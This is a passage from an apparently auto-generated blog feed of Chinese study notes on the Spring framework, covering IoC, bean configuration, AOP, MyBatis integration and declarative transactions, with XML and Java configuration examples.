class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    自动扫描包，让指定包下的注解生效--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.controller"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    让SpringMVC不处理静态资源--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    自动注入,JSON乱码问题配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mvc:message-converters</span> <span class="attr">register-defaults</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.xml.SourceHttpMessageConverter"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.cbor.MappingJackson2CborHttpMessageConverter"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"objectMapper"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.http.converter.json.Jackson2ObjectMapperFactoryBean"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"failOnEmptyBeans"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span> <span class="attr">id</span>=<span class="string">"internalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Spring学习总结</title>
      <link href="/2020/10/17/Spring%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/17/Spring%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring课堂记录"><a href="#Spring课堂记录" class="headerlink" title="Spring课堂记录"></a>Spring课堂记录</h1><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h2 id="IOC理论推导"><a href="#IOC理论推导" class="headerlink" title="IOC理论推导"></a>IOC理论推导</h2><ol><li>UserDao</li><li>UserDaoImpl</li><li>UserService</li><li>UserServiceImpl</li></ol><p>在之前的业务中,用户的需求可能会影响我们的源代码,我们要根据用户的需求修改源代码,如果代码量非常大,修改一次的成本十分昂贵!</p><p>使用一个Set接口,利用set进行动态值的注入,会发生革命性的变化!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHello</span><span class="params">(Hello hello)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.hello = hello;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>之前,是程序主动创造对象!控制权在程序员手上!</li><li>使用set注入后,程序不在具有主动性,而是变成了被动的接受对象!</li></ul><p>这种思想,从本质上解决了问题,程序员不用再去管理对象的创建.系统的耦合性大大降低,可以使程序猿更加专注在业务的实现上!这是IOC的原型!</p><h2 id="IOC实现"><a href="#IOC实现" class="headerlink" title="IOC实现"></a>IOC实现</h2><ul><li>An architecture for end-to-end and inter-domain trusted mail delivery service</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol><li><p>在beans.xml 中配置注册pojo类,将这些类交给spring进行管理</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- more bean definitions go here --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用beans</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create and configure beans</span></span><br><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"services.xml"</span>, <span class="string">"daos.xml"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// retrieve configured instance</span></span><br><span class="line">PetStoreService service = context.getBean(<span class="string">"petStore"</span>, PetStoreService.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// use configured instance</span></span><br><span class="line">List&lt;String&gt; userList = service.getUsernameList();</span><br></pre></td></tr></table></figure></li><li><p>bean中的参数</p><ol><li><strong>id</strong>:bean的唯一标识</li><li><strong>class</strong>:bean绑定的pojo对象</li><li><strong>autowire</strong>:通过set方法中的属性自动装配其他的bean</li></ol></li></ol><h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><ul><li><a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#beans-constructor-injection" target="_blank" rel="noopener">构造器注入</a></li><li>set注入<ul><li>依赖:bean对象的创建依赖与容器!</li><li>注入:bean对象的所有属性有容器注入!</li></ul></li><li><a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#beans-factory-properties-detailed" target="_blank" rel="noopener">拓展方式注入</a> </li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"exampleBean"</span> <span class="attr">class</span>=<span class="string">"examples.ExampleBean"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- constructor injection using the nested ref element --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">"anotherExampleBean"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- constructor injection using the neater ref attribute --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">"yetAnotherBean"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"int"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"anotherExampleBean"</span> <span class="attr">class</span>=<span class="string">"examples.AnotherBean"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"yetAnotherBean"</span> <span class="attr">class</span>=<span class="string">"examples.YetAnotherBean"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="bean的作用域"><a href="#bean的作用域" class="headerlink" title="bean的作用域"></a><a href="https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#beans-factory-scopes" target="_blank" rel="noopener">bean的作用域</a></h3><ul><li><p>==单例模式==(spring默认机制) :这全局唯一,永远只创建一个实例</p><p><img src="/Users/xuehuzhou/Library/Application Support/typora-user-images/image-20200924191429236.png" alt="image-20200924191429236"></p></li></ul>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.something.DefaultAccountService"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- the following is equivalent, though redundant (singleton scope is the default) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.something.DefaultAccountService"</span> <span class="attr">scope</span>=<span class="string">"singleton"</span>/&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>原型模式:每次都会产生一个新的对象</p><p><img src="/Users/xuehuzhou/Library/Application Support/typora-user-images/image-20200924204552279.png" alt="image-20200924204552279"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.something.DefaultAccountService"</span> <span class="attr">scope</span>=<span class="string">"prototype"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>#### </p></li></ul><h2 id="Spring注解开发"><a href="#Spring注解开发" class="headerlink" title="Spring注解开发"></a>Spring注解开发</h2><h3 id="applicationContext-xml配置文件"><a href="#applicationContext-xml配置文件" class="headerlink" title="applicationContext.xml配置文件"></a>applicationContext.xml配置文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai.pojo"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="bean的注入包括"><a href="#bean的注入包括" class="headerlink" title="bean的注入包括"></a>bean的注入包括</h3><ul><li>在<strong>pojo</strong>中直接用<strong>[@Component]</strong></li><li>在<strong>service</strong>中使用<strong>[@Service]</strong></li><li>在<strong>dao</strong>使用<strong>[@Repository]</strong></li><li>在<strong>controller</strong>使用<strong>[@Controller]</strong></li></ul><h3 id="值与对象的注入"><a href="#值与对象的注入" class="headerlink" title="值与对象的注入"></a>值与对象的注入</h3><ul><li><p>[@Value(“huzai”)]对值的注入</p></li><li><p>[@Scope(“protoType”)]作用域的注入</p></li><li><p>[@Autowired] 对对象中的对象的注入</p></li><li><p>[@Qualifier(value = “dog”)] 配合@Autowired使用,指定精确的注入对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"huzai"</span>)</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="meta">@Qualifier</span>(value = <span class="string">"dog"</span>)</span><br><span class="line"><span class="keyword">private</span> Dog dog;</span><br></pre></td></tr></table></figure></li><li><p>[@Nullable]表明字段可以为空</p></li></ul><h3 id="完全不用xml配置的注解开发"><a href="#完全不用xml配置的注解开发" class="headerlink" title="完全不用xml配置的注解开发"></a>完全不用xml配置的注解开发</h3><ul><li>配置用config.java(相当于beans.xml)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">//注册一个bean,相当于一个bean的标签</span></span><br><span class="line">  <span class="comment">//方法的名字相当于bean标签中的id属性</span></span><br><span class="line">  <span class="comment">//方法的返回值相当于bean标签中的class属性</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>静态代理也就是项目横向开发的过程,在此过程中,猿们无需改变以前的代码,因为这是公司中的大忌.</p><h4 id="角色分析"><a href="#角色分析" class="headerlink" title="角色分析"></a>角色分析</h4><ul><li>抽象角色:一般使用接口或抽象类来解决</li><li>真实角色:被代理的角色</li><li>代理角色:代理真实角色,一般有一些附属操作</li><li>客户:访问代理对象的人</li></ul><h4 id="代码步骤"><a href="#代码步骤" class="headerlink" title="代码步骤"></a>代码步骤</h4><ol><li><p>接口</p></li><li><p>真实角色</p></li><li><p>代理角色</p></li><li><p>客户端访问</p></li></ol><h4 id="代理模式的好处"><a href="#代理模式的好处" class="headerlink" title="代理模式的好处"></a>代理模式的好处</h4><ul><li>可以是真实角色的操作更加纯粹,不用关心其他公共业务</li><li>公共业务可以交给代理角色!实现了业务的分工!</li><li>公共业务发生集中在一起,方便管理</li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li>一个真实角色产生一个代理,代码量翻倍,开发效率变低</li></ul><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul><li>角色与静态代理一样</li><li>代理动态生成</li><li>分为两大类<ul><li>基于接口 – JDK’动态代理</li><li>基于类 – cglib</li><li>基于java字节码 – javassit</li></ul></li><li>优点<ul><li>除了静态代理的</li><li>一个动态代理类可以代理多个类,只要实现了对应的借口</li><li>一个动态代理类代理的是一个接借口,一般对应的是一类业务</li></ul></li></ul><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><h3 id="在Spring中的作用"><a href="#在Spring中的作用" class="headerlink" title="在Spring中的作用"></a>在Spring中的作用</h3><p>==提供声明式事物;允许用户自定义切面==</p><h3 id="Spring中实现AOP"><a href="#Spring中实现AOP" class="headerlink" title="Spring中实现AOP"></a>Spring中实现AOP</h3><ul><li><p>AOP依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>配置文件:applicationContext.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">         https://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.huzai"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>方式</p><ul><li><p>方式一:使用Spring API接口</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"pointcut"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.huzai.service.UserServiceImpl.*(..))"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"log"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>方式二:自定义类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    方式二：使用自定义类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">"diyPointCut"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"pointcut"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.huzai.service.*.*(..))"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">"before"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>方式三:使用注解开发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationPoint</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"execution(* com.huzai.pojo.User.* (..))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"====开始===="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Spring整合Mybatis"><a href="#Spring整合Mybatis" class="headerlink" title="Spring整合Mybatis"></a>Spring整合Mybatis</h2><h3 id="使用Spring-的数据源"><a href="#使用Spring-的数据源" class="headerlink" title="使用Spring 的数据源"></a>使用Spring 的数据源</h3><ul><li>参数包括连接数据库的所有参数</li><li>以及对数据进行约束的数据源自带的约束</li><li>一般的数据源包括 c3p0、druid、dbcp</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql://localhost:3306/mybatis?useSSL=false&amp;amp;useUnicode=true&amp;amp;encoding=utf8"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"asdqwe123."</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="构造SqlsessionFactory"><a href="#构造SqlsessionFactory" class="headerlink" title="构造SqlsessionFactory"></a>构造SqlsessionFactory</h3><ul><li>需要设置如下的参数<ul><li>数据源dataSource</li><li>加载mybatis的配置文件</li><li>mapperLocation的地址</li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span> <span class="attr">value</span>=<span class="string">"classpath:mybatisConfig.xml"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapperLocations"</span>  <span class="attr">value</span>=<span class="string">"classpath:com/huzai/mapper/*.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="构造SqlsessionTemplete-sqlsession"><a href="#构造SqlsessionTemplete-sqlsession" class="headerlink" title="构造SqlsessionTemplete(sqlsession)"></a>构造SqlsessionTemplete(sqlsession)</h3><ul><li>需要将其注入到ServiceImpl</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionTemplate"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionTemplate"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"0"</span> <span class="attr">ref</span>=<span class="string">"sqlSessionFactory"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="声明式事物"><a href="#声明式事物" class="headerlink" title="声明式事物"></a>声明式事物</h2><h3 id="事物"><a href="#事物" class="headerlink" title="事物:"></a>事物:</h3><ul><li>要么都成功,要么都失败!</li><li>涉及到数据的一致性问题</li><li>确保完整性和一致性</li></ul><h3 id="事物的ACID原则"><a href="#事物的ACID原则" class="headerlink" title="事物的ACID原则;"></a>事物的ACID原则;</h3><ul><li>原子性</li><li>一致性</li><li>隔离性<ul><li>多个业务可能操作同一个资源,防止数据损害</li></ul></li><li>持久性</li></ul><h3 id="Spring中的事物管理"><a href="#Spring中的事物管理" class="headerlink" title="Spring中的事物管理"></a>Spring中的事物管理</h3><h4 id="申明式事物-AOP"><a href="#申明式事物-AOP" class="headerlink" title="申明式事物:AOP"></a>申明式事物:AOP</h4><h5 id="配置申明式事物"><a href="#配置申明式事物" class="headerlink" title="配置申明式事物"></a>配置申明式事物</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 